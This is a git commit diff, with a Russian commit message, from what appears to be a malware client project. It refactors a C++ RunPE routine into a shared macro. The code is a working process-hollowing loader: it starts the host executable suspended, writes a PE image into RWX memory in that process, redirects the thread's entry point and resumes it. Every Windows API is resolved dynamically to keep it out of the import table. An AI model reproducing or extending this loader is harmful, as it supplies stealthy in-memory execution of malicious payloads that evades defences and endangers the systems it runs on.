2fbe3e5c0db8636ce277676bf5508c7ff65c0e1a
soamane <somane@mail.ru>
2024-05-01 19:10:42 +0300

    Добавлен общий макрос GET_FUNCTION_PTR

--- client/user/runpe/runpe.cpp
+++ client/user/runpe/runpe.cpp
@@ -1,5 +1,7 @@
 #include "runpe.h"
 
+#define GET_FUNCTION_PTR(function, fname) reinterpret_cast<decltype(&function)>(RpGetProcAddress("kernel32.dll", fname))
+
 void RunPE::RunExecutable(std::vector<char>& Image, LPCSTR CmdLine) {
     PVOID pImage = static_cast<PVOID>(Image.data());
 
@@ -14,59 +16,33 @@ void RunPE::RunExecutable(std::vector<char>& Image, LPCSTR CmdLine) {
     memset(&pi, 0, sizeof(pi));
 
     char FilePath[256];
-    reinterpret_cast<decltype(&GetModuleFileNameA)>(RpGetProcAddress("kernel32.dll", "GetModuleFileNameA"))
-        (nullptr, FilePath, MAX_PATH);
+    GET_FUNCTION_PTR(GetModuleFileNameA, "GetModuleFileNameA")(nullptr, FilePath, MAX_PATH);
 
     DosHeader = PIMAGE_DOS_HEADER(pImage);
     NtHeaders = PIMAGE_NT_HEADERS64(reinterpret_cast<ULONGLONG>(pImage) + DosHeader->e_lfanew);
 
     if (NtHeaders->Signature == IMAGE_NT_SIGNATURE) {
-
-        if (reinterpret_cast<decltype(&CreateProcessA)>(RpGetProcAddress("kernel32.dll", "CreateProcessA"))
-            (FilePath, const_cast<char*>(CmdLine), 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &si, &pi)) {
+        if (GET_FUNCTION_PTR(CreateProcessA, "CreateProcessA")(FilePath, const_cast<char*>(CmdLine), 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &si, &pi)) {
 
             auto ctx = PCONTEXT{};
-            ctx = LPCONTEXT(reinterpret_cast<decltype(&VirtualAlloc)>(RpGetProcAddress("kernel32.dll", "VirtualAlloc"))
-                (0, sizeof(ctx), MEM_COMMIT, PAGE_READWRITE));
+            ctx = LPCONTEXT(GET_FUNCTION_PTR(VirtualAlloc, "VirtualAlloc")(0, sizeof(ctx), MEM_COMMIT, PAGE_READWRITE));
 
             ctx->ContextFlags = CONTEXT_FULL;
 
-            if (reinterpret_cast<decltype(&GetThreadContext)>(RpGetProcAddress("kernel32.dll", "GetThreadContext"))
-                (pi.hThread, LPCONTEXT(ctx))) {
-
-                auto ImageBase = reinterpret_cast<decltype(&VirtualAllocEx)>(RpGetProcAddress("kernel32.dll", "VirtualAllocEx"))
-                    (pi.hProcess, LPVOID(NtHeaders->OptionalHeader.ImageBase), NtHeaders->OptionalHeader.SizeOfImage,
-                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-                reinterpret_cast<decltype(&WriteProcessMemory)>(RpGetProcAddress("kernel32.dll", "WriteProcessMemory"))
-                    (pi.hProcess, ImageBase, pImage, NtHeaders->OptionalHeader.SizeOfHeaders, NULL);
+            if (GET_FUNCTION_PTR(GetThreadContext, "GetThreadContext")(pi.hThread, LPCONTEXT(ctx))) {
+                auto ImageBase = GET_FUNCTION_PTR(VirtualAllocEx, "VirtualAllocEx")(pi.hProcess, LPVOID(NtHeaders->OptionalHeader.ImageBase), NtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                GET_FUNCTION_PTR(WriteProcessMemory, "WriteProcessMemory")(pi.hProcess, ImageBase, pImage, NtHeaders->OptionalHeader.SizeOfHeaders, NULL);
 
                 for (auto i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {
-
                     SectionHeader = PIMAGE_SECTION_HEADER(reinterpret_cast<ULONGLONG>(pImage) + DosHeader->e_lfanew + 264 + (i * 40));
-
-                    reinterpret_cast<decltype(&WriteProcessMemory)>(RpGetProcAddress("kernel32.dll", "WriteProcessMemory"))
-                        (pi.hProcess, LPVOID(ULONGLONG(ImageBase) + SectionHeader->VirtualAddress),
-                            LPVOID(ULONGLONG(pImage) + SectionHeader->PointerToRawData),
-                            SectionHeader->SizeOfRawData, NULL
-                            );
-
-                    reinterpret_cast<decltype(&WriteProcessMemory)>(RpGetProcAddress("kernel32.dll", "WriteProcessMemory"))
-                        (pi.hProcess, LPVOID(ctx->Rdx + 0x10),
-                            LPVOID(&NtHeaders->OptionalHeader.ImageBase),
-                            8, NULL
-                            );
+                    GET_FUNCTION_PTR(WriteProcessMemory, "WriteProcessMemory")(pi.hProcess, LPVOID(ULONGLONG(ImageBase) + SectionHeader->VirtualAddress), LPVOID(ULONGLONG(pImage) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, NULL);
+                    GET_FUNCTION_PTR(WriteProcessMemory, "WriteProcessMemory")(pi.hProcess, LPVOID(ctx->Rdx + 0x10), LPVOID(&NtHeaders->OptionalHeader.ImageBase), 8, NULL);
                 }
 
                 ctx->Rcx = ULONGLONG(ImageBase) + NtHeaders->OptionalHeader.AddressOfEntryPoint;
-                reinterpret_cast<decltype(&SetThreadContext)>(RpGetProcAddress("kernel32.dll", "SetThreadContext"))
-                    (pi.hThread, LPCONTEXT(ctx));
-
-                reinterpret_cast<decltype(&ResumeThread)>(RpGetProcAddress("kernel32.dll", "ResumeThread"))
-                    (pi.hThread);
-
-                reinterpret_cast<decltype(&WaitForSingleObject)>(RpGetProcAddress("kernel32.dll", "WaitForSingleObject"))
-                    (pi.hProcess, 0);
+                GET_FUNCTION_PTR(SetThreadContext, "SetThreadContext")(pi.hThread, LPCONTEXT(ctx));
+                GET_FUNCTION_PTR(ResumeThread, "ResumeThread")(pi.hThread);
+                GET_FUNCTION_PTR(WaitForSingleObject, "WaitForSingleObject")(pi.hProcess, 0);
             }
         }
     }
